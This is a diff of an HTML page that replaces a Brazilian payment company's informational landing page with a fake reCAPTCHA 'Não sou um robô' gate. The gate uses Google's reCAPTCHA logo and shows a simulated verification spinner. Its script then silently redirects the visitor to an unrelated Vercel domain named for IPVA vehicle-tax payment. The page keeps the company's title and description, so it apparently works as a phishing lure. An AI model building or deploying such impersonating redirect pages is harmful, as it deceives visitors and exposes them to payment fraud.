@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -7,462 +6,249 @@
 <title>Zapay Serviços de Pagamentos S.A.</title>
 <meta name="description" content="Conheça a Zapay Serviços de Pagamentos S.A., empresa brasileira especializada em soluções digitais, tecnologia e serviços online.">
 <meta name="keywords" content="zapay, tecnologia, pagamentos, soluções digitais, serviços online">
-<meta name="robots" content="index,follow">
-<style>
 
+<style>
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial, Helvetica, sans-serif;
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
 }
 
 body{
-background:#f5f7fb;
-color:#1a1a1a;
-line-height:1.6;
-}
-
-header{
-background:#0f172a;
-color:#fff;
-padding:20px 0;
-position:sticky;
-top:0;
-z-index:1000;
+  font-family:'Segoe UI',Arial,sans-serif;
+  background:linear-gradient(135deg,#f1f5f9,#ffffff,#eef2ff);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  padding:20px;
 }
 
 .container{
-width:90%;
-max-width:1200px;
-margin:auto;
-}
-
-nav{
-display:flex;
-justify-content:space-between;
-align-items:center;
-}
-
-.logo{
-font-size:28px;
-font-weight:bold;
-}
-
-.menu a{
-color:#fff;
-text-decoration:none;
-margin-left:25px;
-font-size:15px;
-}
-
-.hero{
-background:linear-gradient(135deg,#0f172a,#2563eb);
-padding:100px 20px;
-text-align:center;
-color:#fff;
-}
-
-.hero h1{
-font-size:48px;
-margin-bottom:20px;
-}
-
-.hero p{
-max-width:800px;
-margin:auto;
-font-size:20px;
-}
-
-.btn{
-display:inline-block;
-margin-top:30px;
-padding:15px 35px;
-background:#fff;
-color:#2563eb;
-font-weight:bold;
-text-decoration:none;
-border-radius:8px;
-}
-
-section{
-padding:80px 0;
-}
-
-.section-title{
-text-align:center;
-font-size:36px;
-margin-bottom:50px;
-}
-
-.cards{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-gap:25px;
+  width:100%;
+  max-width:420px;
 }
 
 .card{
-background:#fff;
-padding:30px;
-border-radius:12px;
-box-shadow:0 5px 20px rgba(0,0,0,.08);
+  background:#ffffff;
+  border-radius:24px;
+  padding:30px;
+  border:1px solid #e2e8f0;
+  box-shadow:
+    0 20px 40px rgba(15,23,42,.08),
+    0 4px 12px rgba(15,23,42,.04);
+  animation:fadeIn .6s ease;
 }
 
-.card h3{
-margin-bottom:15px;
-color:#2563eb;
+.title{
+  font-size:24px;
+  color:#0f172a;
+  font-weight:700;
+  margin-bottom:10px;
+  text-align:center;
 }
 
-.about{
-background:#fff;
+.subtitle{
+  font-size:14px;
+  color:#64748b;
+  text-align:center;
+  margin-bottom:25px;
 }
 
-.steps{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-gap:20px;
+.captcha-box{
+  border:1px solid #e2e8f0;
+  border-radius:18px;
+  padding:18px;
+  background:#f8fafc;
 }
 
-.step{
-background:#fff;
-padding:25px;
-border-radius:12px;
-box-shadow:0 5px 20px rgba(0,0,0,.08);
-text-align:center;
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
 }
 
-.company{
-background:#eef4ff;
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:12px;
+  border-radius:12px;
+  cursor:pointer;
+  transition:all .25s ease;
 }
 
-.info-grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-gap:20px;
+.check-area:hover{
+  background:#eef2ff;
 }
 
-.info-box{
-background:#fff;
-padding:25px;
-border-radius:10px;
+.check-area input{
+  width:22px;
+  height:22px;
+  accent-color:#22c55e;
+  cursor:pointer;
 }
 
-.faq-item{
-background:#fff;
-padding:20px;
-margin-bottom:15px;
-border-radius:10px;
+.check-text{
+  font-size:15px;
+  color:#0f172a;
+  font-weight:500;
 }
 
-.contact{
-background:#fff;
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
 }
 
-form{
-display:grid;
-gap:15px;
-max-width:700px;
-margin:auto;
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
 }
 
-input,textarea{
-padding:15px;
-border:1px solid #ddd;
-border-radius:8px;
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #dbeafe;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
 }
 
-button{
-padding:15px;
-border:none;
-background:#2563eb;
-color:#fff;
-font-size:16px;
-cursor:pointer;
-border-radius:8px;
+.secure{
+  margin-top:18px;
+  text-align:center;
+  font-size:13px;
+  color:#16a34a;
+  font-weight:700;
 }
 
-footer{
-background:#0f172a;
-color:#fff;
-padding:50px 0;
+.footer{
+  margin-top:18px;
+  font-size:12px;
+  color:#64748b;
+  text-align:center;
+  line-height:1.5;
 }
 
-footer a{
-color:#fff;
-text-decoration:none;
+.footer span{
+  display:block;
+  margin-top:6px;
+  color:#94a3b8;
 }
 
-.footer-grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-gap:30px;
+@keyframes spin{
+  from{
+    transform:rotate(0deg);
+  }
+  to{
+    transform:rotate(360deg);
+  }
 }
 
-@media(max-width:768px){
-
-.hero h1{
-font-size:34px;
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
 }
-
-.menu{
-display:none;
-}
-
-}
-
 </style>
 </head>
 
 <body>
 
-<header>
-<div class="container">
-<nav>
-<div class="logo">Zapay</div>
-
-<div class="menu">
-<a href="#sobre">Sobre</a>
-<a href="#servicos">Serviços</a>
-<a href="#empresa">Empresa</a>
-<a href="#contato">Contato</a>
-</div>
-</nav>
-</div>
-</header>
-
-<section class="hero">
-
-<h1>Soluções Digitais para Simplificar sua Jornada</h1>
-
-<p>
-Tecnologia, inovação e serviços digitais desenvolvidos para oferecer praticidade,
-segurança e eficiência na experiência dos usuários.
-</p>
-
-<a href="#sobre" class="btn">Conheça a Empresa</a>
-
-</section>
-
-<section id="sobre" class="about">
-
 <div class="container">
 
-<h2 class="section-title">Quem Somos</h2>
+  <div class="card">
 
-<p style="text-align:center;max-width:900px;margin:auto;font-size:18px;">
-A Zapay Serviços de Pagamentos S.A. é uma empresa brasileira especializada em
-soluções digitais, plataformas tecnológicas e serviços online. Desde 2017,
-atua no desenvolvimento de tecnologias voltadas à integração de informações,
-serviços digitais e experiências modernas para usuários e parceiros.
-</p>
+    <div class="title">
+      Verificação de Acesso
+    </div>
 
-</div>
+    <div class="subtitle">
+      Confirme sua identidade para continuar
+    </div>
 
-</section>
+    <div class="captcha-box">
 
-<section id="servicos">
+      <div class="captcha-row">
 
-<div class="container">
+        <label class="check-area">
 
-<h2 class="section-title">Nossos Serviços</h2>
+          <input type="checkbox" id="check">
 
-<div class="cards">
+          <div id="loader" class="loader"></div>
 
-<div class="card">
-<h3>Soluções Digitais</h3>
-<p>Ferramentas online para facilitar o acesso a serviços digitais.</p>
-</div>
+          <span class="check-text" id="text">
+            Não sou um robô
+          </span>
 
-<div class="card">
-<h3>Tecnologia</h3>
-<p>Desenvolvimento de plataformas modernas e seguras.</p>
-</div>
+        </label>
 
-<div class="card">
-<h3>Integrações</h3>
-<p>Conexão entre sistemas, parceiros e usuários.</p>
-</div>
+        <div class="captcha-brand">
 
-<div class="card">
-<h3>Serviços Online</h3>
-<p>Ambientes digitais projetados para praticidade e eficiência.</p>
-</div>
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
 
-</div>
+          reCAPTCHA
+          <br>
 
-</div>
+          <span style="font-size:9px;">
+            Privacidade - Termos
+          </span>
 
-</section>
+        </div>
 
-<section>
+      </div>
 
-<div class="container">
+    </div>
 
-<h2 class="section-title">Como Funciona</h2>
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
 
-<div class="steps">
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
 
-<div class="step">
-<h3>1</h3>
-<p>Acesse a plataforma.</p>
-</div>
+      <span>
+        Isso ajuda a proteger o sistema contra acessos indevidos
+      </span>
+    </div>
 
-<div class="step">
-<h3>2</h3>
-<p>Escolha o serviço desejado.</p>
-</div>
-
-<div class="step">
-<h3>3</h3>
-<p>Visualize as informações disponíveis.</p>
-</div>
-
-<div class="step">
-<h3>4</h3>
-<p>Conclua sua solicitação digitalmente.</p>
-</div>
+  </div>
 
 </div>
-
-</div>
-
-</section>
-
-<section id="empresa" class="company">
-
-<div class="container">
-
-<h2 class="section-title">Dados Corporativos</h2>
-
-<div class="info-grid">
-
-<div class="info-box">
-<strong>Razão Social</strong>
-<p>Zapay Serviços de Pagamentos S.A.</p>
-</div>
-
-<div class="info-box">
-<strong>CNPJ</strong>
-<p>28.593.387/0001-56</p>
-</div>
-
-<div class="info-box">
-<strong>Fundação</strong>
-<p>05/09/2017</p>
-</div>
-
-<div class="info-box">
-<strong>Situação</strong>
-<p>Ativa</p>
-</div>
-
-<div class="info-box">
-<strong>Telefone</strong>
-<p>(61) 3550-6619</p>
-</div>
-
-<div class="info-box">
-<strong>E-mail</strong>
-<p>contato@usezapay.com.br</p>
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-<section>
-
-<div class="container">
-
-<h2 class="section-title">Perguntas Frequentes</h2>
-
-<div class="faq-item">
-<strong>A empresa possui CNPJ ativo?</strong>
-<p>Sim. A empresa possui situação cadastral ativa.</p>
-</div>
-
-<div class="faq-item">
-<strong>Quando foi fundada?</strong>
-<p>Em setembro de 2017.</p>
-</div>
-
-<div class="faq-item">
-<strong>Quais áreas de atuação?</strong>
-<p>Tecnologia, plataformas digitais, informação e serviços online.</p>
-</div>
-
-</div>
-
-</section>
-
-<section id="contato" class="contact">
-
-<div class="container">
-
-<h2 class="section-title">Entre em Contato</h2>
-
-<form>
-
-<input type="text" placeholder="Nome">
-
-<input type="email" placeholder="E-mail">
-
-<input type="tel" placeholder="Telefone">
-
-<textarea rows="6" placeholder="Mensagem"></textarea>
-
-<button type="submit">
-Enviar Mensagem
-</button>
-
-</form>
-
-</div>
-
-</section>
-
-<footer>
-
-<div class="container">
-
-<div class="footer-grid">
-
-<div>
-<h3>Zapay Serviços de Pagamentos S.A.</h3>
-<p>CNPJ: 28.593.387/0001-56</p>
-</div>
-
-<div>
-<h3>Contato</h3>
-<p>contato@usezapay.com.br</p>
-<p>(61) 3550-6619</p>
-</div>
-
-<div>
-<h3>Endereço</h3>
-<p>
-Setor SHN Quadra 1<br>
-Conj A Bloco D Salas 304, 305 e 306<br>
-Edifício Fusion Work<br>
-Asa Norte - Brasília/DF
-</p>
-</div>
-
-</div>
-
-</div>
-
-</footer>
 
 <script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
 
-document.querySelector("form").addEventListener("submit", function(e){
-e.preventDefault();
-alert("Mensagem enviada com sucesso!");
+check.addEventListener("change", () => {
+
+  if(check.checked){
+
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
+
+    setTimeout(() => {
+
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
+
+      window.location.href = "https://ipva-es.vercel.app";
+
+    }, 1800);
+
+  }
+
 });
-
 </script>
 
 </body>
